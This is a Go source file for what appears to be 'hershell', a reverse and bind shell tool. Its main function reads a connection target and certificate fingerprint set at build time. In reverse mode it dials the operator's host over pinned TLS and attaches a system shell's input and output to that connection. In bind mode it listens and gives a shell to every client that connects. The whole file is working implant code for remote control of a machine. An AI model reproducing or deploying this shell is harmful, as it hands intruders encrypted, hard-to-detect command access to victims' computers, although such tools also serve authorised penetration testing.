package main

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"hershell/shell"
	"math/big"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	ERR_COULD_NOT_DECODE    = 1 << iota
	ERR_HOST_UNREACHABLE    = iota
	ERR_BAD_FINGERPRINT     = iota
	ERR_KEY_GENERATION      = iota
	ERR_RAND_GENERATION     = iota
	ERR_CERT_CREATION       = iota
	ERR_MARSHAL_PRIVATE_KEY = iota
	ERR_X509_KEYPAIR        = iota
	ERR_LISTEN_FAILED       = iota
)

var (
	connectString string
	fingerPrint   string
	connType      string
)

func RunShell(conn net.Conn) {
	var cmd *exec.Cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func GenerateCert() tls.Certificate {
	priv, err := ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
	if err != nil {
		os.Exit(ERR_KEY_GENERATION)
	}
	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		os.Exit(ERR_RAND_GENERATION)
	}
	notBefore := time.Now()
	notAfter := notBefore.Add(time.Hour * 24 * 365)
	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization: []string{"Sysdream"},
		},
		NotBefore:   notBefore,
		NotAfter:    notAfter,
		KeyUsage:    x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IsCA:        true,
		BasicConstraintsValid: true,
	}
	ifaces, err := net.InterfaceAddrs()
	for _, i := range ifaces {
		if ipnet, ok := i.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			template.IPAddresses = append(template.IPAddresses, ipnet.IP)
		}
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		os.Exit(ERR_CERT_CREATION)
	}
	pemCert := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	b, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		os.Exit(ERR_MARSHAL_PRIVATE_KEY)
	}
	pemKey := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: b})
	certificate, err := tls.X509KeyPair(pemCert, pemKey)
	if err != nil {
		os.Exit(ERR_X509_KEYPAIR)
	}
	return certificate
}

func Reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}

	defer conn.Close()

	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(ERR_BAD_FINGERPRINT)
	}
	RunShell(conn)
}

func Bind(addr string) {
	cert := GenerateCert()
	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	listener, err := tls.Listen("tcp", addr, config)
	if err != nil {
		os.Exit(ERR_LISTEN_FAILED)
	}
	defer listener.Close()
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go RunShell(conn)
	}
}

func main() {
	if connectString != "" && fingerPrint != "" && connType != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		switch connType {
		case "reverse":
			Reverse(connectString, bytesFingerprint)
		case "bind":
			Bind(connectString)
		default:
			Reverse(connectString, bytesFingerprint)
		}
	}
}
